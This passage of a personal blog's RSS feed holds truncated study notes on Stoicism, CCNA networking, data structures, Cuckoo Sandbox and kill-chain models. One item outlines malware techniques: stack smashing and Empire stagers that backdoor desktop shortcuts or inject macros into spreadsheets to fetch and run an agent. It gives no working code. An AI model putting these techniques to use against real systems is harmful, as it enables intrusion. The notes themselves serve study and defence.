      <description>Stages of stoicism:  Early:  Zeno of Citium(founder;330bce):  stoicism comes from the parto of the agora zeno and it&amp;rsquo;s followers would meet and discuss philosophy, Painted Stoa(covered colonnades), first named Zenonians, then named Stoics influenced by cynics, plato, megarian   Aristo of Chios(pupil of zeno):  focused on ethics eavily influenced by the cynics   Cleantes of Assos(turkey):  head of school after Zeno known for a religios ode to Zeus might have been his commentaries on Heraclitus physics that influenced Stoic physics   Chrysippus of Soli(cicilia, asia minor;230bce as headmaster;205bce death):  third head of the Stoic school the great unifier, systematised the Stoic philosophy of its predecessors     middle(these started to inspire themselves from other philosophies):  Panaetius of Rhodes(185bce - 110bce;head of stoa in 128bce):  influenced Cicero influenced by Plato and Aristotle   Posidonius of Apamea(siria;135bce - 51bce):  Cicero was his pupil polymath contribuing to history, geography, astronomy, meteorology, biology and anthropology famous contributions in psychology     late(first hand sources are available):  these stoics lose interest in physics and logic and focus on practical ethics Seneca:  leters to St.</description>
    </item>
    
    <item>
      <title>Malware techniques RE</title>
      <link>https://www.dinudev.com/post/malware_techniques_re/</link>
      <pubDate>Sun, 16 Feb 2020 21:18:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/malware_techniques_re/</guid>
      <description>Smashing the stack:  when you make a call, you push the address to return to onto the stack overwrite that address  empire:  source discontinued but a fork is currently mantained by BC Security: launchers:  powershell python   stagers:  backdoorLnkMacro:  backdoor .lnk on desktop that on click will attempt to download and run an empire agent structure:  xls file new or with data macro to be injected into the xls xml holds data about empire install, this will be hosted on the c2   behaviour:  two-stage macro:  stage 1: vbscript that backdoors all the .</description>
    </item>
    
    <item>
      <title>CCNA</title>
      <link>https://www.dinudev.com/post/ccna/</link>
      <pubDate>Sun, 16 Feb 2020 15:33:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/ccna/</guid>
      <description>ch1 internetworking:  Chapter concepts  Infrastructure components:  firewalls access points wireless controllers   Networking topologies:  star mesh hybrid     What is an internetwork:  two or more networks connected via a router and configured with a logical network addressing scheme with a protocol such as ip or ipv6   network segmentation:  use switches to segment each sw interface into a separate collision domain hubs connect network segments routers break up a broadcast domain   network broadcast:  every device on the network must read and process the broadcast, unless its a router   collision domain:  a device sends a packet out on a network segment and every other device is forced to pay attention no matter what if two devices try to send packets at the same time, a collision occurs and they need to retransmit the packet sequentially   devices:  routers:  break up broadcast domains break up collision domains don&amp;rsquo;t forward broadcasts by default can filter the net based on layer 3(network layer) ip address(logical addressing) packet switching packet filtering:  via access lists   internetwork communication:  connect two or more networks together   path selection:  uses a routing table to map networks to paths   L3 switches provide connection between virtual lans(vlans) can provide quality of service(QOS) for specific types of network traffic it only cares where a network is located and how to get to it   switches:  forward and filter frames L2 switches optimize LAN performance does not break up domains by default switch frames from a port to another withing a switched network each port is a different collision domain in a switched network, you still need a router to provide communication between VLANS it only cares about uniquelly identifying a lan device   wlan device(wireless nic) access points:  extend a collision domain they are in their own broadcast domain(vlan)   firewalls:  controll incoming and outgoing net traffic they are usually an ips(intrusion protection system)     common lan traffic congestion reasons:  too many hosts in a collision or broadcast domain broadcast storms too much multicast traffic low bandwidth adding hubs for connectivity to the network a bunch of arp broadcasts    Communication modes:  simplex: one-way communication(say something and not get a reply) half-duplex: two-way communication(receiver has to wait for the sender to finish sending the message, then it can send a response back) full-duplex: two-way communication(devices receive and transmit at the same time)  Communication types:  connection-oriented:  caracteristics:  virtual circuit(three-way handshake) uses sequencing uses acknowledgments uses flow control   steps:  first establish a connection-oriented session with a &amp;ldquo;three-way handshake&amp;rdquo;:  segment from sender to receiver to request for synchronization(SYN) segment from receiver to sender to acknowledge(ACK) the request and establish connection parameters segment from sender to receiver to acknowledge(ACK) that the connection agreement has been accepted and the actual connection has been established   transfer data termination call that tears down the virtual circuit      Flow control: (provide a way for the receiver to control the amount of data sent by the sender)</description>
    </item>
    
    <item>
      <title>First Http Email - 1991</title>
      <link>https://www.dinudev.com/post/first_http_email_1991/</link>
      <pubDate>Thu, 13 Feb 2020 00:00:00 +0000</pubDate>
      
      <guid>https://www.dinudev.com/post/first_http_email_1991/</guid>
      <description>From: timbl@info .cern.ch (Tim Berners-Lee)   Newsgroups: alt.hypertext   Subject: Re: Qualifiers on Hypertext links&amp;hellip;   Message-ID: 6484@cernvax.cern.ch   Date: 6 Aug 91 14:56:20 GMT   References: 1991Aug2.115241@ardor.enet.dec.com   Sender: news@cernvax.cern.ch   Lines: 52    In article &amp;lt;1991Aug2.115241@ardor.enet.dec.com&amp;gt; kannan@ardor.enet.dec.com (Nari Kannan) writes:&amp;gt; &amp;gt; Is anyone reading this newsgroup aware of research or development efforts in&amp;gt; the&amp;gt; following areas:&amp;gt; &amp;gt; 1.</description>
    </item>
    
    <item>
      <title>Cuckoo Sandbox Notes</title>
      <link>https://www.dinudev.com/post/cuckoo/</link>
      <pubDate>Tue, 11 Feb 2020 12:36:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/cuckoo/</guid>
      <description>Structure:  CWD is implemented so multiple configurations can work with the same cuckoo install logging is standard python2 logging:  INFO(all) DEBUG WARN   tries to rise soft a dir is created(&amp;ldquo;pidfiles&amp;rdquo;) that holds the pid with the id of the current cuckoo process (maybe an abstraction layer that merges win/linux process viewpoints?) check if curr version is up to date and warn if not check if dependencies have vulnerabilities/are out of date and warn  </description>
    </item>
    
    <item>
      <title>Malware Related Methodologies</title>
      <link>https://www.dinudev.com/post/malware_related_methodologies/</link>
      <pubDate>Mon, 10 Feb 2020 15:36:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/malware_related_methodologies/</guid>
      <description>Kill chain(structure of the attack):  target identification force dispatch to target,decision and order to attack the target destruction of the target  F2T2EA: (it&amp;rsquo;s a chain, because an interruption at any stage can interrupt the entire process)
 find: identify the target fix: fix the target&amp;rsquo;s location track: monitor the target&amp;rsquo;s movements target: select and appropiate weapon/asset based on the target engage: apply weapon/asset on target asses: evaluate the effects of the attack  Four F&amp;rsquo;s:  find the enemy: locate enemy fix the enemy: pin down with suppressing fire fight the enemy: engage in combat or flank finish the enemy: eliminate all the combatants  Unified kill chain:  initial foothold(compromised system):  reconnaissance weaponization delivery social engineering exploitation persistence defense evasion command &amp;amp; control pivoting   network propagation(internal network): 9.</description>
    </item>
    
    <item>
      <title>Data Structures and Algorithms</title>
      <link>https://www.dinudev.com/post/dsa/</link>
      <pubDate>Wed, 08 Jan 2020 11:35:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/dsa/</guid>
      <description>Foundation:  what is an algorithm? why use an algorithm? categories  Algorithms:   searching:
 Binary search:  input: sorted list of elements guess the middle number and eliminate half the remaining numbers every time big o(list of n):  best avg worst: O(log n)   return position of element in list or null      sorting:
 selection sort:  big o:  worst: O(n^2) avg: O(n^2) best: O(n^2)     merge sort:  big o:  worst: O(n log n) avg: O(n log n) best: O(n log n)     Quicksort:  base case recursive case big o:  worst: O(n^2) avg: O(n log n) best: O(n log n)        Data structures:  primitives:  int float char   compound:  Array:  runtimes:  reading: O(1) insertion: O(n) deletion: O(n)   random access contigous spaces in memory to extend you have to find a bigger free space and copy the data there random access is easy, because they are contigous, to access item at index n, BASE + n(based on the fact that n is lower that BASE[MAX]) all elements must be of the same data type   Linked list:  runtimes:  reading: O(n) insertion: O(1) deletion: O(1)   deletion is O(1) only if you can access instantly the element sequential access each item holds a pointer to the next item in the list solves arrays problem of contigous memory allocation by randomly asigning one unit of space for every item in the list good if you want to access all the elements of the list at once if you want to access the last, you need to start from the first and go through every one, until you find the searched one   hash map:  model relations from one item to another an array that uses an hash function to store the values a hash function:  for every string value a different number is created for the same string the same number is created, no matter the ammount of calls knows the array size and returns valid indexes (n=array lengt, hash &amp;gt;= 0, hash &amp;lt; n - 1)   runtime:  worst:  insert: O(n) delete: O(n) read: O(n)   avg:  insert: O(1) delete: O(1) read: O(1)     collision solutions:  start a linked list at the index with multiple values   implement:  take into account the load factor:  items in htable/total slots in htable at &amp;gt;1 load factor the access time is O(n), multiple values with the same hash resize storage when lf is greater than 0.</description>
    </item>
    
  </channel>
</rss>